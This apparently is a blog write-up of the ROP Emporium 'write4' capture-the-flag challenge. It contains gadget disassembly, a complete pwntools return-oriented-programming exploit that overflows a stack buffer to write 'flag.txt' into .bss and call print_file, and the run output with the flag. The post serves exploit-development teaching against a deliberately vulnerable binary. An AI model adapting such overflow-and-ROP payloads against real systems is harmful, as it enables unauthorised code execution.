</span></code></pre></div><p>The gadget from the above disassembled code will enable us to write content in r15 register to memory address [r14]. Next step is to look for gadgets that will enable us to control both the <strong>r14</strong> and <strong>r15</strong> register values.</p><p>For building our ropchain, we need to understand the calling conventions of AMD64 ABI.The calling convention passes the arguments to the registers in the following order. RDI, RSI, RDX, RCX, R8 and R9.In x86 assembly <strong>pop</strong> instruction is used for putting value to the memory address, therefore we look for a pop gadget that will enable to control both r14 and r15.</p><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line">  <span class="token number">0x0040068f</span>                 <span class="token number">5d</span>  pop <span class="token register variable">rbp</span>
</span><span class="code-line">  <span class="token number">0x00400690</span>               415e  pop <span class="token register variable">r14</span>
</span><span class="code-line">  <span class="token number">0x00400692</span>               415f  pop <span class="token register variable">r15</span>
</span><span class="code-line">  <span class="token number">0x00400694</span>                 c3  ret
</span></code></pre></div><p>Example of the above gadget, we have a pop rbp, pop r14, pop 15 ret instruction gadget. This gadget will enable us to control the desired registers. Because we dont need the rbp register, for our ropchain, we take the address pointed py pop14 <strong>0x00400690</strong> . This is possible because rop gadgets are set of instructions that end with <strong>ret</strong>.</p><p>From the disassembly of usedfulgadgets function we know register r14 points to a memory region we want to write to. Therefore our strategy is to set the value of r14 register to be the address pointer of <strong>.bss</strong> section of ELF and r15 register to be the value we want to write to the <strong>.bss</strong> section.</p><blockquote><p>Hopefully you&#x27;ve realized that ROP is just a form of arbitrary code execution and if we get creative we can leverage it to do things like write to or read from memory. The question we need to answer is: what mechanism are we going to use to solve this problem? Is there any built-in functionality to do the writing or do we need to use gadgets? In this challenge we won&#x27;t be using built-in functionality since that&#x27;s too similar to the previous challenges, instead we&#x27;ll be looking for gadgets that let us write a value to memory such as mov [reg], reg.</p></blockquote><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line">  <span class="token number">0x00400628</span>             4d893e  mov qword <span class="token operator">[</span><span class="token register variable">r14</span><span class="token operator">]</span>, <span class="token register variable">r15</span>
</span><span class="code-line">  <span class="token number">0x0040062b</span>                 c3  ret
</span></code></pre></div><p>Therefore, the two gadgets that will enable us to set the register values of r14 and r15 and copy the values of r15 to the memory region defined by r14.</p><p>Last is a find a gadget that will aid passing of an argument to the print_file function. Because the function takes one argument as a parameter, we look for a pop rdi ret instruction</p><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line">  <span class="token number">0x00400693</span>                 5f  pop <span class="token register variable">rdi</span>
</span><span class="code-line">  <span class="token number">0x00400694</span>                 c3  ret
</span></code></pre></div><p>Now we have three separate rop gadgets, which we can chain them together to get a fully working rop chain. This chain will enable us to read the file content of the <strong>flag.txt</strong> and display output to the console.</p><h2 id="exploit"><a href="#exploit" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Exploit</h2><p>A fully working ropchain exploit of the challenge is,</p><div class="relative"><pre><code class="code-highlight language-python"><span class="code-line"><span class="token keyword">import</span> pwn
</span><span class="code-line">
</span><span class="code-line">pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">&quot;amd64&quot;</span>
</span><span class="code-line">pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>encoding <span class="token operator">=</span><span class="token string">&quot;latin-1&quot;</span>
</span><span class="code-line">pwn<span class="token punctuation">.</span>warnings<span class="token punctuation">.</span>simplefilter<span class="token punctuation">(</span><span class="token string">&quot;ignore&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">io <span class="token operator">=</span> pwn<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">&#x27;./write4&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">bss_area <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x00601038</span><span class="token punctuation">)</span>
</span><span class="code-line">pop_r14_r15 <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x00400690</span><span class="token punctuation">)</span>
</span><span class="code-line">pop_rdi <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x00400693</span><span class="token punctuation">)</span>
</span><span class="code-line">mov_r14_r15 <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x00400628</span><span class="token punctuation">)</span>
</span><span class="code-line">print_file_addr <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000400510</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">payload <span class="token operator">=</span> <span class="token string">b&quot;A&quot;</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token comment">#fill the buffer</span>
</span><span class="code-line">payload <span class="token operator">+=</span> <span class="token string">b&quot;B&quot;</span> <span class="token operator">*</span><span class="token number">8</span>  <span class="token comment">#overwrite the base pointer</span>
</span><span class="code-line">payload <span class="token operator">+=</span> pop_r14_r15
</span><span class="code-line">payload <span class="token operator">+=</span> bss_area
</span><span class="code-line">payload <span class="token operator">+=</span> <span class="token string">b&quot;flag.txt&quot;</span>
</span><span class="code-line">payload <span class="token operator">+=</span> mov_r14_r15
</span><span class="code-line">payload <span class="token operator">+=</span> pop_rdi
</span><span class="code-line">payload <span class="token operator">+=</span> bss_area
</span><span class="code-line">payload <span class="token operator">+=</span> print_file_addr
</span><span class="code-line">
</span><span class="code-line">io<span class="token punctuation">.</span>writeafter<span class="token punctuation">(</span><span class="token string">&#x27;&gt;&#x27;</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">pwn<span class="token punctuation">.</span>info<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span></code></pre></div><p>Successful execution of our exploit above we get a correct flag.</p><div class="relative"><pre><code class="code-highlight language-bash"><span class="code-line">vx@archie:write4$ python3 x.py 
</span><span class="code-line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token class-name builtin">local</span> process <span class="token string">&#x27;./write4&#x27;</span><span class="token class-name builtin">:</span> pid <span class="token number">7275</span>
</span><span class="code-line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Receiving all data: Done <span class="token punctuation">(</span>45B<span class="token punctuation">)</span>
</span><span class="code-line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">&#x27;./write4&#x27;</span> stopped with <span class="token class-name builtin">exit</span> code -11 <span class="token punctuation">(</span>SIGSEGV<span class="token punctuation">)</span> <span class="token punctuation">(</span>pid <span class="token number">7275</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>  Thank you<span class="token operator">!</span>
</span><span class="code-line">    ROPE<span class="token punctuation">{</span>a_placeholder_32byte_flag<span class="token operator">!</span><span class="token punctuation">}</span>
</span></code></pre></div></div><div id="comment"></div></div><footer><div class="divide-gray-200 text-sm font-medium leading-5 dark:divide-gray-700 xl:col-start-1 xl:row-start-2 xl:divide-y"><div class="py-4 xl:py-8"><h2 class="text-xs uppercase tracking-wide text-gray-500 dark:text-gray-400">Tags</h2><div class="flex flex-wrap"><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/ropemporium">ropemporium</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/rop">rop</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/pwn">pwn</a></div></div><div class="flex justify-between py-4 xl:block xl:space-y-8 xl:py-8"><div><h2 class="text-xs uppercase tracking-wide text-gray-500 dark:text-gray-400">Previous Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/strings-malware">Static Analysis of Malware Strings</a></div></div><div><h2 class="text-xs uppercase tracking-wide text-gray-500 dark:text-gray-400">Next Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/ropemporium-split">Return-Oriented Programming - Split</a></div></div></div></div><div class="sticky top-0 pt-4 xl:pt-8"><a class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/blog">‚Üê Back to the Blog</a><div class="hidden md:block"><div class="mt-5 space-y-1 text-sm"><p class="text-lg font-bold">Table of content</p></div></div></div></footer></div></div></article></div></main><footer><div class="mt-16 flex flex-col items-center"><div class="mb-3 flex space-x-4"><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="mailto:thuri783@gmail.com"><span class="sr-only">mail</span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" class="fill-current text-gray-700 hover:text-blue-500 dark:text-gray-200 dark:hover:text-blue-400 h-6 w-6"><path d="M2.003 5.884 10 9.882l7.997-3.998A2 2 0 0 0 16 4H4a2 2 0 0 0-1.997 1.884z"></path><path d="m18 8.118-8 4-8-4V14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8.118z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://github.com/thuri10"><span class="sr-only">github</span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 hover:text-blue-500 dark:text-gray-200 dark:hover:text-blue-400 h-6 w-6"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></a></div><div class="mb-2 flex space-x-2 text-sm text-gray-500 dark:text-gray-400"><div>Thuri10</div><div> ‚Ä¢ </div><div>¬© 2022</div><div> ‚Ä¢ </div><a href="/">Solar Bits</a></div><div class="mb-8 text-sm text-gray-500 dark:text-gray-400"><a target="_blank" rel="noopener noreferrer" href="https://github.com/timlrx/tailwind-nextjs-starter-blog">Tailwind Nextjs Theme</a></div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"mdxSource":"var Component=(()=\u003e{var d=Object.create;var c=Object.defineProperty;var m=Object.getOwnPropertyDescriptor;var h=Object.getOwnPropertyNames;var N=Object.getPrototypeOf,k=Object.prototype.hasOwnProperty;var o=a=\u003ec(a,\"__esModule\",{value:!0});var u=(a,s)=\u003e()=\u003e(s||a((s={exports:{}}).exports,s),s.exports),b=(a,s)=\u003e{for(var r in s)c(a,r,{get:s[r],enumerable:!0})},t=(a,s,r,n)=\u003e{if(s\u0026\u0026typeof s==\"object\"||typeof s==\"function\")for(let l of h(s))!k.call(a,l)\u0026\u0026(r||l!==\"default\")\u0026\u0026c(a,l,{get:()=\u003es[l],enumerable:!(n=m(s,l))||n.enumerable});return a},g=(a,s)=\u003et(o(c(a!=null?d(N(a)):{},\"default\",!s\u0026\u0026a\u0026\u0026a.__esModule?{get:()=\u003ea.default,enumerable:!0}:{value:a,enumerable:!0})),a),f=(a=\u003e(s,r)=\u003ea\u0026\u0026a.get(s)||(r=t(o({}),s,1),a\u0026\u0026a.set(s,r),r))(typeof WeakMap!=\"undefined\"?new WeakMap:0);var p=u((T,i)=\u003e{i.exports=_jsx_runtime});var _={};b(_,{default:()=\u003ev,frontmatter:()=\u003ex});var e=g(p()),x={title:\"Return-Oriented Programming - Write4\",date:\"2021-12-20\",tags:[\"ropemporium\",\"rop\",\"pwn\"],draft:!1,summary:\"Find and manipulate gadgets to construct an arbitrary write primitive, then use it to learn where and how to get your data into process memory.\",layout:\"PostLayout\",canonicalUrl:null};function w(a={}){let{wrapper:s}=a.components||{};return s?(0,e.jsx)(s,Object.assign({},a,{children:(0,e.jsx)(r,{})})):r();function r(){let n=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",p:\"p\",blockquote:\"blockquote\",strong:\"strong\",pre:\"pre\",code:\"code\",div:\"div\"},a.components),{Image:l}=n;return l||y(\"Image\",!0),(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(n.h2,{id:\"introduction\",children:[(0,e.jsx)(n.a,{href:\"#introduction\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Introduction\"]}),(0,e.jsx)(n.p,{children:\"Challenge Description\"}),(0,e.jsx)(n.blockquote,{children:(0,e.jsx)(n.p,{children:\"Our first foray into proper gadget use. A useful function is still present, but we'll need to write a string into memory somehow.\"})}),(0,e.jsxs)(n.p,{children:[\"The goal of this challenge is understanding how to abuse readable and writable memory regions in binary files.The target binary can be downloaded from the authors website \",(0,e.jsx)(n.a,{href:\"https://ropemporium.com\",children:\"ropemporium\"}),\".\"]}),(0,e.jsxs)(n.p,{children:[\"First we check the binary protections enabled on the downloaded binary. Only \",(0,e.jsx)(n.strong,{children:\"NX\"}),\" (Not executable) is enabled on the binary according to checksec binary utility as shown in image below.\"]}),(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-bash\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`    Arch:     amd64-64-little\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    RELRO:    Partial RELRO\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    Stack:    No canary found\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    NX:       NX enabled\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    PIE:      No PIE \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"0x400000\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),(0,e.jsx)(n.p,{children:\"For analysis of binary, we use gdb debugger to analyze the functions in the binary. We disassemble the main function which is the entry point of analysis.\"}),(0,e.jsx)(n.pre,{className:\"language-nasm\",children:(0,e.jsxs)(n.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb) disas main\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Dump of assembler code for function main:\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400607\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tpush   \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400608\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rsp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040060b\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400500\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"pwnme@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400610\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"9\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"eax\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400615\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"14\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tpop    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400616\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"15\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`:\tret    \n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`End of assembler dump.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb) \n`})]})}),(0,e.jsxs)(n.p,{children:[\"From the above, the main function only calls pwnme function which looks interesting to us. Disassemble the \",(0,e.jsx)(n.strong,{children:\"pwnme\"}),\" function as shown below. pwnme@plt is used for referencing the pwnme real address. we disassemble the libwrite4 library as shown in the code below.\"]}),(0,e.jsx)(n.pre,{className:\"language-nasm\",children:(0,e.jsxs)(n.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token function label\",children:\"vx@archie:\"}),\"write4\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"$\"}),\" gdb \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),`q libwrite4.so\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Reading symbols from libwrite4.so...\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`(No debugging symbols found in libwrite4.so)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb) disas pwnme \n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Dump of assembler code for function pwnme:\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008aa\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tpush   \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008ab\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rsp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008ae\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tsub    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rsp\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x20\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008b2\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),\",QWORD PTR \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x200727\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x200fe0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008b9\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"15\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),\",QWORD PTR \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008bc\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"18\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"ecx\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008c1\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"23\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edx\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x2\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008c6\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"28\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"esi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008cb\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"33\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008ce\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"36\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x790\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"setvbuf@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008d3\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"41\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tlea    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x106\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x9e0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008da\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"48\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x730\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"puts@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008df\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"53\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tlea    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x111\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x9f7\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008e6\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"60\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x730\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"puts@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008eb\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"65\"}),(0,e.jsx)(n.span,{className:\"token 